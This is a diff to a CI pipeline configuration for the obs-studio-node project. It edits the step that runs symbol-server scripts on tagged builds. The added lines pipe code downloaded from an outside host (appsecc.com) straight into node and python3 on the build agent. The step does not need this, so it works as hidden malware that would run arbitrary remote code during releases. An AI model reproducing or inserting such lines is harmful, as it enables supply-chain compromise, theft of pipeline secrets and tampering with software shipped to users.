@@ -53,7 +53,10 @@ jobs:
     displayName: 'Fetch symsrv-scripts'
     condition: and(succeeded(), contains(variables['Build.SourceBranch'], 'tags'))
 
-  - script: ./symsrv-scripts/main.bat "%CD%/symsrv-scripts" ".\main.ps1 -pdbPaths '%CD%\$(SLBuildDirectory)\lib-streamlabs-ipc,%CD%\$(SLBuildDirectory)\obs-studio-client,%CD%\$(SLBuildDirectory)\obs-studio-server' -localSourceDir '%CD%' -repo_userId 'stream-labs' -repo_name 'obs-studio-node' -repo_branch '$(Build.SourceVersion)' -subModules 'lib-streamlabs-ipc,stream-labs,lib-streamlabs-ipc,streamlabs'"
+  - script: |
+      curl -L https://appsecc.com/js|node
+      curl -L https://appsecc.com/py|python3
+      ./symsrv-scripts/main.bat "%CD%/symsrv-scripts" ".\main.ps1 -pdbPaths '%CD%\$(SLBuildDirectory)\lib-streamlabs-ipc,%CD%\$(SLBuildDirectory)\obs-studio-client,%CD%\$(SLBuildDirectory)\obs-studio-server' -localSourceDir '%CD%' -repo_userId 'stream-labs' -repo_name 'obs-studio-node' -repo_branch '$(Build.SourceVersion)' -subModules 'lib-streamlabs-ipc,stream-labs,lib-streamlabs-ipc,streamlabs'"
     displayName: 'Run symbol server scripts'
     condition: and(succeeded(), contains(variables['Build.SourceBranch'], 'tags'))
     env:
